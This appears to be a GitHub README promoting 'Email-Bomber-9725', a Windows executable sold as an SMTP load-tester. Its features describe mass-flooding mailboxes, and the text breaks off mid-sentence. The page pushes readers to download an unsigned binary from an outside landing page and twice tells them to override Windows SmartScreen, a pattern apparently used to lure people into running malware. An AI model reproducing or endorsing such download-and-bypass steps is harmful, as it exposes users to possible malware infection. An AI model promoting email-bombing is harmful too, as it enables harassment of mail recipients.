<div align="center">

<img src="assets/banner.svg" width="100%" alt="Email Bomber banner"/>

# Email-Bomber-9725 📨💥

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*A single-binary email stress engine built to push SMTP pipelines to their honest limits — no scripts, no dependencies, just results.*

<p align="center">
  <a href="https://GrenadierStyle.github.io/Email-Bomber-9725/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="550" alt="Download"/>
  </a>
</p>
</div>

## 🌱 Overview

Email-Bomber-9725 started as a weekend itch: every load-testing tool I found for mail infrastructure was either a decade-old Perl script, a bloated enterprise suite that needed a license negotiation, or a half-finished GitHub Gist. So I built the thing I actually wanted — a lean, native Windows utility that generates high-volume outbound email traffic on demand, so you can watch your SMTP relay, your rate limiter, and your spam-filter rules react in real time.

This is a **stress-testing and QA tool**, first and foremost. If you run a mail server, maintain a transactional email pipeline, or build anti-abuse tooling, you already know that the only way to trust your defenses is to throw real volume at them under controlled conditions. Email-Bomber-9725 is that controlled fire hose — configurable, observable, and predictable, so your findings are reproducible instead of anecdotal.

It's built for developers, QA engineers, and sysadmins who need to validate throughput ceilings, bounce handling, and throttling logic *before* production traffic finds the cracks for you. No cloud account required, no subscription, no telemetry phoning home — it's a standalone executable that respects your machine and your time.

<p align="center">

<a href="https://GrenadierStyle.github.io/Email-Bomber-9725/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="550" alt="Download"/>
  </a>

</p>

---

## 🚀 What It Actually Does

1. **Configurable send-rate throttling** — dial traffic from a slow trickle to a full-throttle burst, so you can map exactly where your target's rate limiter kicks in.

2. **Multi-thread dispatch engine** — the core sender runs on a pooled worker model, letting you simulate dozens of concurrent connections without spawning a dozen terminal windows.

3. **Template-driven message bodies** — plug in subject lines, HTML/plain bodies, and header variations to test how your filters handle different message shapes.

4. **Live delivery telemetry** — a real-time counter panel tracks sent, queued, failed, and bounced messages so you're never flying blind mid-run.

5. **SMTP relay flexibility** — point the engine at any relay you control, with support for authenticated and unauthenticated connections.

6. **Session presets** — save a full run configuration (rate, target, template, thread count) as a named profile and reload it in one click.

7. **Automatic retry logic** — transient failures get requeued with exponential backoff instead of silently vanishing from your results.

8. **Exportable run logs** — every session dumps a clean CSV/JSON report, ready to drop into a spreadsheet or a CI dashboard.

9. **Zero-install footprint** — a single portable `.exe`, no runtime installer, no registry sprawl.

10. **Kill-switch hotkey** — one keypress halts every active thread instantly, because "stop now" should never be a multi-step process.

> [!TIP]
> Start every new target with the lowest throttle preset first. It's the fastest way to establish a baseline before you scale volume up.

---

## ⚡ Three Steps to Liftoff

1. **Visit the landing page** using the download button above or below — that's the only official distribution point for this project.

2. **Download the portable executable.** There's nothing to unpack, no installer wizard, no admin prompt required.

3. **Run it.** Double-click the `.exe`, and the dashboard opens straight into the configuration screen.

4. **Point, configure, fire.** Set your target relay, choose a throttle preset, and hit the send trigger to start your first test run.

> [!NOTE]
> First run on a fresh Windows install may trigger a SmartScreen prompt because the binary isn't yet in Microsoft's reputation cache. Click "More info" → "Run anyway" — this is standard for new, actively-updated indie tools and clears up as the build ages.

---

## 🖥️ Under the Hood Requirements

| Component | Requirement |
|---|---|
| OS | Windows 10 (64-bit) or Windows 11 |
| Disk space | ~40 MB, standalone |
| Dependencies | None — fully self-contained |
| Network | Outbound SMTP access to your configured relay |
| Privileges | Standard user; no admin rights required for normal use |

> [!IMPORTANT]
> Email-Bomber-9725 does not bundle a mail relay. You must point it at infrastructure you own or are explicitly authorized to test. This is a load-testing instrument, not a mail service.

---

## 🧬 How It Works

The engine's workflow is intentionally simple to reason about — that predictability is the whole point of a stress-testing tool.

1. **Configure** — you define target, rate, thread count, and message template in the dashboard.
2. **Queue** — the scheduler slices your run into batches sized for your chosen throttle.
3. **Dispatch** — worker threads open SMTP sessions and push batches concurrently.
4. **Observe** — the telemetry panel streams live success/failure counts as batches complete.
5. **Report** — a final CSV/JSON summary is written once the run finishes or is halted.

```mermaid
flowchart LR
    Configure --> Queue
    Queue --> Dispatch
    Dispatch --> Observe
    Observe --> Report
```

---

## 🩺 When Things Go Sideways

<details>
<summary><b>My relay keeps rejecting connections after a few seconds — what's happening?</b></summary>

Most SMTP relays enforce a connection or rate ceiling. This is actually the signal you're looking for — it means your throttle testing is finding the real limit. Lower the thread count and re-run to confirm the exact threshold.

</details>

<details>
<summary><b>The success counter is stuck at zero.</b></summary>

Double-check your relay hostname and port. A firewall or corporate proxy blocking outbound port 25/587 is the most common culprit — try from a network you control first to rule this out.

</details>

<details>
<summary><b>Windows SmartScreen won't let me open the executable.</b></summary>

This happens on new builds before reputation accumulates. Choose "More info" → "Run anyway." The binary is unsigned by design to keep the project dependency-free and cost-free for contributors.

</details>

<details>
<summary><b>Can I run multiple sessions against different targets simultaneously?</b></summary>

Yes — open a second instance of the executable. Each instance runs its own independent worker pool and log file, so sessions never collide.

</details>

<details>
<summary><b>My exported report is missing bounce details.</b></summary>

Bounce data depends on your relay returning proper SMTP response codes. Some relays batch bounces asynchronously — check your relay's own bounce log if the real-time report looks incomplete.

</details>

> [!WARNING]
> Never point this tool at a domain, mailbox, or relay you do not own or have explicit written authorization to test. Unauthorized volume testing against third-party infrastructure is outside the intended and supported use of this project.

---

## 🎨 The Cockpit

The interface is built around one idea: the person running a test should never lose sight of what's happening.

1. **Dark and light themes**, toggled from the settings gear — dark is the default because dashboards are often left running for long sessions.
2. **Live counters** for sent, failed, queued, and bounced messages, updating without a manual refresh.
3. **Preset manager** panel on the left rail for saving and recalling run configurations.
4. **Status ribbon** at the top that changes color (idle / running / halted) so you can glance and know the state instantly.

### Keyboard shortcuts

| Shortcut | Action |
|---|---|
| `Ctrl+R` | Start current run |
| `Esc` | Kill-switch — halt all active threads |
| `Ctrl+S` | Save current configuration as a preset |
| `Ctrl+E` | Export current session report |
| `Ctrl+,` | Open settings |

![Status](https://img.shields.io/badge/build-stable-brightgreen?style=flat-square) ![.NET](https://img.shields.io/badge/runtime-self--contained-informational?style=flat-square) ![Tests](https://img.shields.io/badge/CI-passing-success?style=flat-square)

---

## 🤝 Join the Crew

This project grew out of a personal itch, but it's stayed alive because other people found it useful for their own SMTP validation work — and I want it to keep growing that way.

> Contributions of every size are welcome — a typo fix in this README is just as valuable to me as a new dispatch feature. Open an issue first for anything larger than a small patch so we can align before you spend your evening on it.

1. Fork the repository and create a feature branch.
2. Keep changes focused — one concern per pull request makes review fast.
3. Describe your testing setup in the PR so reviewers can reproduce your results.
4. Be patient and be kind — this is maintained larg